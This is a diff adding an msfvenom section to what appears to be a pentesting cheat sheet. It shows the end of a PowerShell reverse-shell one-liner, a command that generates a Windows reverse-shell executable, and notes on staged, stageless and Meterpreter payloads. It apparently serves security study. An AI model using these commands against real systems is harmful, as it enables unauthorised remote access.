@@ -89,3 +89,45 @@ powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);
 ```
 * Replace the IP and port
 * Will work on cmd.exe shell or webshell
+<br> <br> <br><br> <br> <br>
+# Msfvenom
+Standard Syntax: `msfvenom -p <PAYLOAD> <OPTIONS>`
+<br>To generate a Windows x64 Reverse Shell in an exe format: <br>
+```bash
+msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
+```
+
+## Payloads
+* Staged: 2 Parts; 1. Small Stager (Creates Connection) & 2. Bulkier Reverse Shell Code downloaded later
+* Stageless: Self-contained Payloads that immediately sends a shell back <br>
+**NOTE:** Stageless Payloads are easier to send but easily discovered by AV. Staged Payloads are more efficient.
+
+## Meterpreter
+* Metasploit's Own Shells and they must be caught in metasploit
+* Fully Stable
+* Good for Windows Targets
+
+## Payload Naming Conventions
+Basic Convention: `<OS>/<arch>/<payload>` <br>
+For example:
+`linux/x86/shell_reverse_tcp` <br>
+The exception to this convention is Windows 32bit targets. For these, the arch is not specified. e.g.: `windows/shell_reverse_tcp`
+
+<br>
+For a 64bit Windows target, the arch would be specified as normal (x64).
+
+For Full List of Payloads:
+```bash
+msfvenom --list payloads
+```
+
+### Optional Read
+In the above examples the payload used was shell_reverse_tcp. This indicates that it was a stageless payload. How? Stageless payloads are denoted with underscores (_). The staged equivalent to this payload would be:
+`shell/reverse_tcp`
+<br>
+As staged payloads are denoted with another forward slash (/).
+<br>
+This rule also applies to Meterpreter payloads. A Windows 64bit staged Meterpreter payload would look like this: `windows/x64/meterpreter/reverse_tcp`
+
+A Linux 32bit stageless Meterpreter payload would look like this:
+`linux/x86/meterpreter_reverse_tcp`
